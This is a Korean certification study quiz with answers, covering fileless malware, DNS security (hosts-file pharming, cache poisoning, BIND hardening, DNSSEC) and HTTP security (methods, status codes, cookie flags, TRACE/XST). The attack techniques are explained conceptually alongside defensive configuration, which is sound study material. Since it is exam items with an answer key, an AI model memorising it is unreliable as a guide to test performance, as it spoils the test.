---
title: quiz-application
tags: []
aliases: []
date modified: 2026-04-05 17:47:30 +09:00
date created: 2026-02-25 10:46:47 +09:00
---

## [7] 애플리케이션 기본 학습

<details>
<summary>(서술형) 악성코드가 파일 시스템에 설치되지 않고, 윈도우의 <code>PowerShell</code>, <code>WMI</code>, 레지스트리 등 정상적인 시스템 도구와 메모리 자원만을 악용하여 실행되는 '파일리스(Fileless) 악성코드'의 특징과 전통적인 백신(Anti-Virus) 프로그램이 이를 탐지하기 어려운 이유를 서술하시오.</summary>
<blockquote>
<strong>특징</strong>: 하드디스크에 실행 파일(<code>.exe</code>) 형태의 흔적을 남기지 않고 시스템의 메모리(RAM) 상에서만 동작한다.<br>
<strong>탐지 어려운 이유</strong>: 전통적인 백신은 주로 디스크에 저장된 파일의 시그니처(해시값)를 기반으로 악성코드를 탐지하지만, 파일리스 악성코드는 파일 자체가 없고 정상적인 OS 내장 도구를 사용하여 실행되므로 시그니처 기반 검사를 우회하기 때문이다.
</blockquote>
</details>

<details>
<summary>(단답형) 전자상거래 지불 프로토콜에서 주문 정보와 지불 정보를 각각 해시한 후 이를 합쳐 다시 해시하여 서명함으로써, 상점은 지불 정보를 알 수 없고 은행은 주문 내용을 알 수 없게 만드는 기술의 명칭을 쓰시오.</summary>
<blockquote>
이중 서명 (Dual Signature)
</blockquote>
</details>

<details>
<summary>(기출 23회 10번 문제) (단답형) OpenSSL의 하트비트(Heartbeat) 확장 기능에서 데이터 길이에 대한 검증 미흡으로 인해 서버 메모리의 민감 정보(64KB)가 유출될 수 있는 취약점(CVE-2014-0160)의 명칭은?</summary>
<blockquote>
<strong>Heartbleed (하트블리드)</strong>
</blockquote>
</details>

### DNS(Domain Name System)

<details>
<summary>[기출 20회 9번 문제] (단답형) 클라우드 서비스 이용 중지 후에도 DNS의 CNAME 설정을 삭제하지 않아, 공격자가 해당 도메인을 피싱 사이트 등으로 악용하는 공격 방식을 무엇이라 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>서브도메인 하이재킹 (Subdomain Takeover)</strong>
</blockquote>
</details>

<details>
<summary>[기출 21회 16번 문제] (실무형) MASTER와 SLAVE DNS 서버의 존파일 설정과 관련하여 (A)~(F)에 들어갈 내용을 기술하시오.<br>
- Master DNS 서버 설정: <code>zone "korea.co.kr" IN { type (A); … allow-update {(B)}; };</code><br>
- Master 존파일 레코드: <code>ns1 IN A (C)</code>, <code>ns2 IN A (D)</code><br>
- Slave DNS 서버 설정: <code>zone "korea.co.kr" IN { type (E); … masters {(F)}; };</code></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>master</strong>, (B) <strong>192.168.1.2</strong> (Slave IP), (C) <strong>192.168.1.1</strong>, (D) <strong>192.168.1.2</strong>, (E) <strong>slave</strong>, (F) <strong>192.168.1.1</strong> (Master IP)
</blockquote>
</details>

<details>
<summary>[기출 22회 8번 문제] (단답형) DNS 서비스와 관련하여 ( )안에 들어갈 용어를 기술하시오.<br>
1. DNS 서비스는 53번 포트를 사용하고 전송 계층 프로토콜로 (A)를 사용한다.<br>
2. DNS 서버는 반복적인 질의로 상위 DNS에 가해지는 부하를 줄이기 위해 (B)를 사용하는데, 해당 정보가 유지되는 기간을 (C)이라고 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>UDP</strong>, (B) <strong>캐시 (Cache)</strong>, (C) <strong>TTL (Time To Live)</strong><br>
※ 해설: 존 전송(Zone Transfer) 등 대량의 데이터 전송 시에는 TCP를 사용하기도 하지만, 일반적인 질의는 UDP를 사용함
</blockquote>
</details>

<details>
<summary>[415] (단답형) 다음 빈칸에 적절한 용어를 쓰시오.<br>
( A )은/는 도메인(Domain) 이름과 ( B )을/를 변환하여 주는 거대한 분산 데이터베이스 시스템으로, 해당 도메인에 대한 정보는 위임받은 서버의 ( C )에 저장된다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>DNS (Domain Name System)</strong>, (B) <strong>IP 주소</strong>, (C) <strong>존(Zone) 파일</strong>
</blockquote>
</details>

<details>
<summary>[416] (단답형) 도메인(Domain) 이름은 호스트(서버)를 식별하기 위한 인터넷 주소로 사람들이 기억하기 쉽고 의미 있게 붙인 이름이지만, 인터넷에서 어떤 컴퓨터를 실제로 찾기 위해서는 숫자 체계로 된 IP 주소가 필요하다. 이를 위해 만들어진 시스템으로 도메인 이름과 IP 주소 변환 서비스를 제공하는 것은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DNS (Domain Name System)</strong>
</blockquote>
</details>

<details>
<summary>[417] (단답형) 도메인명(Domain Name)에 대한 IP 주소가 저장된 파일로, 운영체제에서 DNS 서버에 질의하기 전에 가장 먼저 참조하는 설정 파일의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>hosts</code> 파일 (리눅스: <code>/etc/hosts</code>, 윈도우: <code>%SystemRoot%\system32\drivers\etc\hosts</code>)
</blockquote>
</details>

<details>
<summary>[418] (단답형) 윈도우, 유닉스/리눅스, 맥 등의 시스템에서 DNS 서버에 대한 질의를 수행하지 않고 도메인에 대한 IP 주소를 알아내기 위해 사용하는 설정 파일명을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>hosts</code> 파일
</blockquote>
</details>

<details>
<summary>[419] (단답형) 윈도우 PC 환경에서 DNS 스푸핑 공격에 대응하기 위해서는 주요 접속 서버의 도메인명에 대한 IP 주소를 ( ) 파일에 저장한다.</summary>
<blockquote>
<strong>정답:</strong> <code>hosts</code>
</blockquote>
</details>

<details>
<summary>[420] (서술형) **파밍(Pharming)** 공격의 원리를 <code>hosts</code> 파일 변조 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 공격자가 사용자 PC에 악성코드를 감염시켜 <code>hosts</code> 파일을 조작함으로써, 사용자가 정상적인 도메인 주소를 입력하더라도 공격자가 미리 설정해둔 가짜 사이트(해커의 서버) IP로 접속하도록 리다이렉트하여 개인정보나 금융정보를 탈취하는 공격 기법이다.
</blockquote>
</details>

<details>
<summary>[421] (작업형) 윈도우 시스템에서 현재 메모리에 저장된 **로컬 DNS 캐시 정보**를 확인하는 명령와, 캐시된 정보를 강제로 삭제(초기화)하는 명령어를 각각 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) 확인: <code>ipconfig /displaydns</code><br>
2) 삭제: <code>ipconfig /flushdns</code>
</blockquote>
</details>

<details>
<summary>[422] (작업형/분석) 유닉스/리눅스 시스템에서 DNS 서버 질의를 위해 참조하는 다음 설정 파일들의 역할을 쓰시오.<br>
(A) <code>/etc/hosts</code><br>
(B) <code>/etc/resolv.conf</code></summary>
<blockquote>
<strong>정답:</strong><br>
(A) <code>/etc/hosts</code>: IP 주소와 호스트 네임 간의 매핑 정보를 로컬에 저장하며, 외부 DNS 서버 질의보다 우선순위가 높다.<br>
(B) <code>/etc/resolv.conf</code>: 시스템이 사용할 기본 DNS 서버의 IP 주소(nameserver)와 검색 도메인을 등록하는 설정 파일이다.
</blockquote>
</details>

<details>
<summary>[423] (단답형) 윈도우 시스템에서 일반적으로 사용하지 않는 인터넷 연결 공유(ICS) 시 특정 클라이언트의 IP를 강제로 지정하는 기능을 하는 파일로, 악성코드 제작자가 백신이 주시하는 <code>hosts</code> 대신 변조하여 파밍 사이트로 유도할 수 있는 이 파일의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <code>hosts.ics</code> 파일
</blockquote>
</details>

<details>
<summary>[424] (단답형) 윈도우 DNS 서버 설정 시, 관리하는 도메인을 DNS 서버에 등록하는 ( A )와/과 DNS 서버에 서비스 정보를 입력하는 ( B )이 있다. 빈칸을 채우시오.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>존 설정</strong>, (B) <strong>리소스 레코드 설정</strong>
</blockquote>
</details>

<details>
<summary>[425] (단답형) DNS 서비스는 53번 포트를 사용하고 전송 계층에서 ( A ) 프로토콜을 사용한다. DNS 서버는 상위 DNS 서버에 빈번하게 반복적인 질의를 요청하여 부하가 발생하는 것을 막기 위해 ( B )을/를 사용하고 그 유효기간을 ( C )이라 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>UDP/TCP</strong> (기본은 UDP, 512바이트 초과나 존 전송 시 TCP), (B) <strong>캐시(Cache)</strong>, (C) <strong>TTL (Time To Live)</strong>
</blockquote>
</details>

<details>
<summary>[426] (단답형) 클라이언트의 DNS 질의에 대한 응답 결과를 캐시에 일정 시간 저장하고 있다가 같은 DNS 질의가 들어오면 저장해 둔 정보를 이용하여 즉시 응답해주는 DNS 서버를 무엇이라 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>Recursive (또는 Cache) DNS 서버</strong>
</blockquote>
</details>

<details>
<summary>[427] (단답형) DNS 서버(BIND) 운영 시 버전 정보가 노출되면 해당 버전의 취약점을 이용한 공격에 악용될 수 있다. 버전 정보를 보여주지 않기 위해 <code>named.conf</code> 파일에서 설정하는 지문(options 내)을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>version "unknown";</code> (또는 임의의 문자열 설정)
</blockquote>
</details>

<details>
<summary>[428] (단답형) 취약한 DNS 서버에 조작된 쿼리를 전송하여 DNS 서버가 저장하고 있는 주소 정보를 임의로 변조하는 공격의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DNS 캐시 포이즈닝 (Cache Poisoning)</strong> 공격
</blockquote>
</details>

<details>
<summary>[429] (서술형) **DNS 캐시 포이즈닝** 공격의 원리와 이를 통해 달성하려는 공격 목표를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
<strong>원리</strong>: Recursive DNS 서버가 상위 Authoritative DNS 서버로 보낸 질의에 대해, 공격자가 진짜 서버보다 빠른 응답(포징된 패킷)을 보내 가짜 도메인 정보를 DNS 서버의 캐시에 저장시키는 공격이다.<br>
<strong>목표</strong>: 해당 DNS 서버를 이용하는 다수의 사용자들이 특정 도메인을 요청할 때 공격자가 의도한 가짜 사이트로 접속하게 만드는 대규모 피싱/파밍 공격을 목표로 한다.
</blockquote>
</details>

<details>
<summary>[430] (단답형) DNS 질의 및 응답 과정에서 데이터의 출처 인증(Source Authentication)과 무결성(Integrity)을 보장하기 위해 공개키 암호화 기술과 디지털 서명을 적용한 DNS 보안 확장 표준의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>DNSSEC</code> (Domain Name System Security Extensions)
</blockquote>
</details>

<details>
<summary>[431] (단답형) 파밍(Pharming) 공격은 ISP 캐시 DNS 서버나 사용자 PC에 특정 도메인 네임에 대한 위·변조된 IP 주소가 저장되도록 하는 공격이다. 이와 같은 DNS 데이터의 위·변조를 방지하기 위한 인터넷 표준 기술은?</summary>
<blockquote>
<strong>정답:</strong> <code>DNSSEC</code>
</blockquote>
</details>

<details>
<summary>[432] (작업형/분석) 다음은 BIND DNS 서버의 <code>named.conf</code> 설정 일부이다. 슬레이브(Slave) 네임서버(192.168.2.53)에게만 **존 전송(Zone Transfer)**을 허용하도록 빈칸을 채우시오.<br>
<code>zone "algisa.com" IN {</code><br>
<code> type master;</code><br>
<code> file "algisa.com.zone";</code><br>
<code> <strong>( A )</strong> { 192.168.2.53; };</code><br>
<code>};</code></summary>
<blockquote>
<strong>정답:</strong> <code>allow-transfer</code>
</blockquote>
</details>

<details>
<summary>[433] (작업형) 마스터 DNS 서버에서 **iptables**를 사용하여 슬레이브 서버(IP: secondary.dns.ip)로부터의 존 전송 요청(TCP 53번 포트)만 허용하고 그 외의 모든 53번 접근을 차단하는 설정을 빈칸 (A), (B)를 채워 완성하시오.<br>
<code># iptables -A INPUT -s secondary.dns.ip -p <strong>( A )</strong> --dport <strong>( B )</strong> -j ACCEPT</code><br>
<code># iptables -A INPUT -s 0/0 -p <strong>( A )</strong> --dport <strong>( B )</strong> -j DROP</code></summary>
<blockquote>
<strong>정답:</strong> (A) <code>tcp</code>, (B) <code>53</code> (존 전송은 데이터 신뢰성을 위해 TCP 53번 포트를 사용한다)
</blockquote>
</details>

<details>
<summary>[434] (서술형) DNS의 주요 **리소스 레코드(Resource Record)** 유형 중 다음 2가지의 명칭과 용도를 설명하시오.<br>
(A) <strong>MX</strong><br>
(B) <strong>CNAME</strong></summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>MX (Mail Exchanger)</strong>: 해당 도메인에 수신되는 이메일을 처리할 메일 서버의 주소와 우선순위를 지정한다.<br>
(B) <strong>CNAME (Canonical Name)</strong>: 기존 도메인 이름(별칭)을 실제 도메인 이름(본명)으로 매핑할 때 사용한다.
</blockquote>
</details>

<details>
<summary>[435] (단답형) 기업 내부의 DNS 설정에서 더 이상 사용하지 않는 서비스의 도메인명이 외부의 특정 서비스(예: 클라우드 스토리지, GitHub Pages 등)를 **CNAME**으로 가리키고 있을 때, 공격자가 해당 외부 서비스의 권한을 획득하여 정상적인 서브도메인 접속자들을 가짜 사이트로 유인하는 공격의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>서브도메인 탈취 (Subdomain Takeover)</strong> 또는 Subdomain Hijacking
</blockquote>
</details>

<details>
<summary>[436] (단답형) DNS 서버를 테스트하기 위해 도메인 이름으로 IP 주소를 조회하거나, 반대로 IP 주소로 도메인 이름을 조회하는 등의 질의를 수행하는 대표적인 명령어를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>nslookup</code> (또는 <code>dig</code>, <code>host</code>)
</blockquote>
</details>

<details>
<summary>(기출 23회 18번 문제) (작업형) <code>named.conf</code> 설정을 통해 DNS 마스터(Master)와 슬레이브(Slave) 서버 간의 존 전송(Zone Transfer) 및 업데이트 권한을 구성하려고 한다. 다음 빈칸 (A), (B)를 채우시오.
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
[Master 설정]<br>
zone "korea.co.kr" IN {<br>
&nbsp;&nbsp;type <strong>( A )</strong>;<br>
&nbsp;&nbsp;file "korea.co.kr.zone";<br>
&nbsp;&nbsp;allow-update { 192.168.2.53; };<br>
};<br>
<br>
[Slave 설정]<br>
zone "korea.co.kr" IN {<br>
&nbsp;&nbsp;type <strong>( B )</strong>;<br>
&nbsp;&nbsp;file "slave/korea.co.kr";<br>
&nbsp;&nbsp;masters { 192.168.1.53; };<br>
};
</div>
</summary>
<blockquote>
(A) <strong>master</strong><br>
(B) <strong>slave</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 리눅스 시스템에서 <code>/etc/host.conf</code> 파일의 <code>order hosts, bind</code> 설정이 의미하는 바를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> DNS 질의 시 로컬 <code>hosts</code> 파일을 먼저 검색하여 매핑 정보를 찾고, 실패할 경우 시스템에 설정된 <code>BIND</code> 네임서버로 질의를 수행하라는 의미이다.
</blockquote>
</details>

<details>
<summary>(단답형) 윈도우 시스템에서 인터넷 연결 공유(ICS) 환경의 클라이언트 IP 정보를 강제로 지정하는 파일로, 일반적인 <code>hosts</code> 파일보다 우선순위가 높아 파밍 공격에 악용될 수 있는 이 파일의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <code>hosts.ics</code>
</blockquote>
</details>

<details>
<summary>(단답형) DNS 질의 시 클라이언트가 생성하여 요청 패킷에 포함시키며, 서버로부터의 응답 패킷과 짝을 맞춰 본인의 요청에 대한 응답임을 식별하는 데 사용하는 2바이트 임의값의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>트랜잭션 ID (Transaction ID)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) DNS 응답 데이터가 512바이트를 초과하여 전송될 때 발생하는 패킷상의 변화와 클라이언트의 후속 조치를 설명하시오.</summary>
<blockquote>
<strong>현상:</strong> 네임서버는 응답 패킷의 <strong>재단(Truncated, TC)</strong> 플래그를 <code>1</code>로 설정하여 데이터가 잘렸음을 클라이언트에게 알린다.<br>
<strong>후속 조치:</strong> 이를 수신한 클라이언트는 데이터의 신뢰성 확보 및 전체 데이터 수신을 위해 <strong>TCP 53번 포트</strong>를 사용하여 재질의를 수행한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>DNS 캐시 포이즈닝</strong> 공격이 '생일 공격(Birthday Attack)' 이론에 기반하여 현실적으로 가능한 이유를 기술하시오.</summary>
<blockquote>
공격자가 특정 질의에 대한 Transaction ID를 정확히 하나 찍어서 맞추는 확률보다, 다수의 가짜 응답을 동시에 보낼 때 그중 하나라도 서버의 ID와 일치할 확률이 훨씬 높기 때문이다. 이는 다수의 사람이 모였을 때 생일이 같은 사람이 존재할 확률이 예상보다 높다는 <strong>생일의 역설(Birthday Paradox)</strong> 원리를 이용한 것으로, 대량의 응답 패킷을 통해 짧은 시간 내에 유효한 응답을 가로챌 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) BIND 설정에서 <code>recursion no;</code>와 <code>allow-recursion { IP_대역; };</code>의 보안 설정 목적을 각각 설명하시오.</summary>
<blockquote>
1) <strong>recursion no;</strong>: 모든 재귀적 질의 요청을 거부하여, 네임서버가 외부 질의에 의한 캐시 포이즈닝 공격 경로로 활용되거나 DDoS 공격의 증폭 서버로 악용되는 것을 원천 차단한다.<br>
2) <strong>allow-recursion</strong>: 신뢰할 수 있는 특정 네트워크 대역(예: 내부 임직원망)으로만 재귀적 질의 권한을 제한하여 보안성과 업무 편의를 동시에 확보한다.
</blockquote>
</details>

<details>
<summary>(작업형) <code>dig</code> 명령어 옵션 중 다음 2가지의 기능과 점검 목적의 차이를 설명하시오.<br>
1. <strong>+trace</strong><br>
2. <strong>+norecurse</strong></summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>+trace</strong>: 루트 네임서버부터 계층적인 위임 과정을 따라 질의를 수행하며 위임 상태를 점검한다.<br>
2. <strong>+norecurse</strong>: 재귀적 질의 요청을 하지 않고 Authoritative 서버에 한 번만 질의하여, 해당 서버가 관리 도메인에 대해 직접 권위 있는 응답을 주는지 점검한다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 **SOA(Start Of Authority)** 레코드의 지시어 의미를 각각 쓰시오.<br>
(A) <strong>Serial</strong><br>
(B) <strong>Refresh</strong><br>
(C) <strong>Retry</strong></summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>Serial</strong>: 존 파이의 버전 정보로, 값이 증가하면 슬레이브 서버가 변경을 인지하고 동기화를 시작한다.<br>
(B) <strong>Refresh</strong>: 슬레이브 서버가 마스터 서버의 데이터 업데이트 여부를 확인하기 위해 접속을 시도하는 시간 간격이다.<br>
(C) <strong>Retry</strong>: 슬레이브가 마스터 접속에 실패했을 때 다시 시도하기 전 대기하는 시간이다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 리소스 레코드(Resource Record) 유형의 용도를 설명하시오.<br>
1) <strong>TXT (SPF)</strong><br>
2) <strong>PTR</strong><br>
3) <strong>AAAA</strong></summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>TXT (SPF: Sender Policy Framework)</strong>: 해당 도메인에서 메일을 발송할 권한이 있는 정당한 메일 서버의 IP 정보를 명시하여 스팸 메일을 방지한다.<br>
2) <strong>PTR (Pointer)</strong>: IP 주소를 도메인명으로 변환하는 <strong>역방향 조회(Reverse Lookup)</strong>에 사용된다.<br>
3) <strong>AAAA</strong>: 호스트의 <strong>IPv6</strong> 주소 정보를 담고 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 역방향 조회(Reverse Lookup) 수행 시, <strong>211.92.119.29</strong> 라는 IP에 대응하는 <strong>인버서 존(Inverse Zone)</strong> 도메인 주소는 어떤 형식으로 구성되는지 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>29.119.92.211.in-addr.arpa.</code> (IP 주소의 옥텟을 역순으로 정렬한 뒤 <code>.in-addr.arpa</code>를 붙인다)
</blockquote>
</details>

<details>
<summary>(작업형) <code>whois</code> 명령어를 통해 특정 도메인에 대해 수집할 수 있는 정보 3가지를 기술하시오.</summary>
<blockquote>
1. 도메인 등록 정보 및 소유자 연락처<br>
2. 네트워크 할당 대역 및 관리 ISP 정보<br>
3. 도메인을 관리하는 네임서버(NS)의 명칭 및 IP 주소
</blockquote>
</details>

<details>
<summary>(작업형) BIND 서버의 보안 강화를 위해 <strong>정찰 공격(Footprinting)</strong> 시 버전 정보가 노출되지 않도록 처리하는 설정을 빈칸 (A), (B)를 채워 완성하시오.<br>
<code>options {</code><br>
<code>&nbsp;&nbsp;…</code><br>
<code>&nbsp;&nbsp;<strong>( A )</strong> "<strong>( B )</strong>";</code><br>
<code>};</code></summary>
<blockquote>
<strong>정답:</strong> (A) <code>version</code>, (B) <code>unknown</code> (또는 임의의 문자열)
</blockquote>
</details>

### HTTP(HyperText Transfer Protocol) 보안

<details>
<summary>[기출 22회 4번 문제] (단답형) HTTP Request 입력값에 개행문자가 포함되면 HTTP 응답이 2개 이상으로 분리되어 악의적인 코드를 삽입할 수 있는 공격이 가능해진다. 위에서 언급한 개행 문자 2가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>CR (%0D)</strong>, <strong>LF (%0A)</strong>
</blockquote>
</details>

<details>
<summary>[기출 22회 15번 문제] (서술형) 다음의 쿠키 설정값(Secure, HttpOnly, Expires)의 의미를 보안 측면에서 설명하시오.</summary>
<blockquote>
1. <strong>Secure</strong>: HTTPS 프로토콜을 통해서만 쿠키를 전송하게 하여 중간자 공격(MITM)에 의한 스니핑을 방지함<br>
2. <strong>HttpOnly</strong>: JavaScript(document.cookie)를 통한 쿠키 접근을 원천 차단하여 XSS 공격에 의한 세션 토큰 탈취를 방지함<br>
3. <strong>Expires</strong>: 쿠키의 유효 기간을 설정하여, 브라우저 종료 후에도 남아있는 영구 쿠키의 노출 위험을 제한함
</blockquote>
</details>

<details>
<summary>[기출 13회 4번 문제] (서술형) XSS 공격 시 자바스크립트에 의한 쿠키 탈취는 방지하지만, 네트워크 상의 패킷 가로채기를 통한 세션 하이재킹은 단독으로 방지하지 못하는 쿠키 속성의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>HttpOnly</strong><br>
<strong>해석:</strong> <code>HttpOnly</code> 속성은 클라이언트 사이드 스크립트(JS)의 쿠키 접근을 차단하여 XSS에 의한 탈취를 막지만, 네트워크 상의 스니핑을 통한 세션 하이재킹을 방지하려면 <code>Secure</code> 속성을 함께 보완적으로 사용해야 함.
</blockquote>
</details>

<details>
<summary>[437] (서술형) HTTP의 <strong>상태 비저장(Stateless)</strong> 특성을 극복하기 위한 기술인 '쿠키(Cookie)'와 '세션(Session)'의 저장 위치와 보안성 측면에서의 차이점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>쿠키(Cookie)</strong>: 클라이언트(브라우저) 측에 저장된다. 클라이언트에서 조작이 가능하고 네트워크 전송 시 노출 위험이 있어 보안성이 상대적으로 낮다. 민감한 정보는 암호화(HttpOnly, Secure 속성 등)가 권장된다.<br>
- <strong>세션(Session)</strong>: 서버 측에 상태 정보를 저장하고 클라이언트에게는 세션 ID만 부여한다. 데이터가 서버에 상주하므로 클라이언트의 직접적인 조작이 불가능하여 쿠키보다 보안성이 높다.
</blockquote>
</details>

### HTTP(HyperText Transfer Protocol)

<details>
<summary>[기출 20회 1번 문제] (단답형) 다음은 웹 서버의 지원 메소드를 확인하는 과정이다. ( )에 들어갈 HTTP 메소드는?<br>
<code>root@kali:~# Telnet webserver.com 80</code><br>
<code>( ) * HTTP/1.1</code><br>
<code>Allow: GET, HEAD, POST, OPTIONS, TRACE</code></summary>
<blockquote>
<strong>정답:</strong> <strong>OPTIONS</strong>
</blockquote>
</details>

<details>
<summary>[438] (작업형/분석) 텔넷(Telnet)을 통해 웹 서버에 접속한 후, 서버에서 지원하는 HTTP 메소드(Method) 목록을 확인하기 위해 사용할 수 있는 <strong>( A )</strong> 메소드와 그 결과를 해석하시오.<br>
<code>$ telnet 127.0.0.1 80</code><br>
<code><strong>( A )</strong> / HTTP/1.1</code><br>
<code>Host: 127.0.0.1</code></summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>OPTIONS</strong><br>
<strong>해석</strong>: 서버 응답 헤더의 <code>Allow</code> 항목(예: GET, POST, OPTIONS, TRACE 등)을 통해 해당 웹 서버가 허용하는 메소드 종류를 파악할 수 있다. 불필요한 메소드(PUT, DELETE, TRACE 등)가 활성화되어 있을 경우 보안 취약점이 될 수 있다.
</blockquote>
</details>

<details>
<summary>[439] (단답형/작업형) 다음 주요 **HTTP 상태 코드(Status Code)**의 의미를 각각 쓰시오.<br>
(A) <code>200 OK</code>: <strong>( A )</strong><br>
(B) <code>301 Moved Permanently</code>: <strong>( B )</strong><br>
(C) <code>403 Forbidden</code>: <strong>( C )</strong><br>
(D) <code>404 Not Found</code>: <strong>( D )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>요청이 성공적으로 수행됨</strong>, (B) <strong>요청 자원의 위치가 영구적으로 변경됨</strong>, (C) <strong>요청한 자원에 대한 접근 차단</strong>, (D) <strong>요청한 자원이 존재하지 않음</strong>
</blockquote>
</details>

<details>
<summary>[440] (단답형/작업형) 웹 서버 로그 분석 결과 다음과 같은 상태 코드가 확인되었다. 빈칸을 채우시오.<br>
1) <code>400</code>: <strong>( A )</strong><br>
2) <code>404</code>: <strong>( B )</strong><br>
3) <code>504</code>: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Bad Request</strong> (메시지 문법 오류 등), (B) <strong>Not Found</strong>, (C) <strong>Gateway Timeout</strong> (프록시 응답 지연 등)
</blockquote>
</details>

<details>
<summary>[441] (단답형) 다음 HTTP 상태 코드의 의미를 쓰시오.<br>
1) <code>200</code>: <strong>( A )</strong><br>
2) <code>404</code>: <strong>( B )</strong><br>
3) <code>500</code>: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>OK</strong>, (B) <strong>Not Found</strong>, (C) <strong>Internal Server Error</strong>
</blockquote>
</details>

<details>
<summary>(단답형) HTTP/1.1에서 웹 서버 설정에 따라 TCP 연결 상태를 일정 시간 동안 지속시켜, 반복적인 자원 요청 시마다 3-Way Handshake를 수행하는 부하를 줄여주는 기술의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Keep-Alive</strong> (지속 연결, Persistent Connection)
</blockquote>
</details>

<details>
<summary>(단답형) 아파치 웹 서버 설정(httpd.conf) 중, <code>KeepAlive On</code> 상태에서 하나의 연결을 통해 클라이언트가 연속해서 보낼 수 있는 최대 요청 건수를 제한하는 지시어는?</summary>
<blockquote>
<strong>정답:</strong> <code>MaxKeepAliveRequests</code>
</blockquote>
</details>

<details>
<summary>(단답형) HTTP의 무상태(Stateless) 특성을 극복하기 위해 서버 측에 사용자의 상태 정보를 저장하고, 클라이언트에게는 이를 식별하기 위한 고유 키인 ( A )을/를 발급하여 ( B ) 쿠키 형태로 관리한다. 빈칸을 채우시오.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>세션 ID (Session ID)</strong> (예: JSESSIONID, PHPSESSID), (B) <strong>세션 (Session)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) HTTP 요청 메시지에서 헤더부의 끝을 식별하고 바디(Body)와의 경계를 나누기 위해 사용하는 특수 제어 문자의 조합과 그 아스크 코드(16진수) 값은?</summary>
<blockquote>
<strong>정답:</strong> <strong>CRLF (Carriage Return Line Feed)</strong> 2번 연속 사용, <code>0x0d 0x0a 0x0d 0x0a</code>
</blockquote>
</details>

<details>
<summary>(단답형) 요청 URI로 지정한 자원의 본문(Body)은 응답 데이터에서 제외하고 오직 헤더 정보만을 수신하여, 자원 존재 여부나 변경 시각 등을 효율적으로 확인할 때 사용하는 메소드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>HEAD</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 서버가 수신한 요청 메시지를 본문에 그대로 담아 응답(Loopback)해주는 메소드로, 디버깅 용도이나 공격자가 <code>HttpOnly</code> 쿠키를 탈취하는 <strong>XST(Cross-Site Tracing)</strong> 공격에 악용할 수 있는 것은?</summary>
<blockquote>
<strong>정답:</strong> <strong>TRACE</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 쿼리 스트링(Query String) 구조에서 특정 파라미터에 값을 할당하기 위한 기호와, 여러 파라미터를 연결(구분)하기 위해 사용하는 기호를 각각 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 값 할당: <code>=</code> (Equal), 파라미터 구분: <code>&</code> (Ampersand)
</blockquote>
</details>

<details>
<summary>(단답형) 이전에 요청한 자원이 변경되지 않았음을 서버가 알림으로써 클라이언트가 서버로부터 데이터를 재전송받는 대신 자신의 로컬 캐시 정보를 사용하게 하도록 유도하는 상태 코드는?</summary>
<blockquote>
<strong>정답:</strong> <strong>304 Not Modified</strong>
</blockquote>
</details>

<details>
<summary>(서술형) HTTP 응답 헤더에 <code>Keep-Alive: timeout=15, max=100</code>이 포함되었을 때의 의미를 상세히 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 해당 TCP 연결을 마지막 요청이 완료된 시점부터 최대 <strong>15초</strong> 동안 유지(대기)하며, 이 한 번의 연결을 통해 클라이언트가 보낼 수 있는 최대 요청 건수를 <strong>100건</strong>으로 제한한다는 의미이다.
</blockquote>
</details>

<details>
<summary>(서술형) 로그인 시 아이디와 패스워드를 GET 방식의 쿼리 스트링으로 전송하는 것이 보안상 매우 취약한 기술적 이유를 로그 기록 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> GET 방식은 자격 증명 데이터가 URL의 일부분으로 포함되어 전송되므로, 브라우저의 방문 기록은 물론 중간 경로의 <strong>프록시 로그</strong> 및 최종 목적지인 <strong>웹 서버의 액세스 로그(access_log)</strong>에 평문으로 남게 되어 추후 관리자나 공격자에 의해 정보가 유출될 위험이 크기 때문이다.
</blockquote>
</details>

<details>
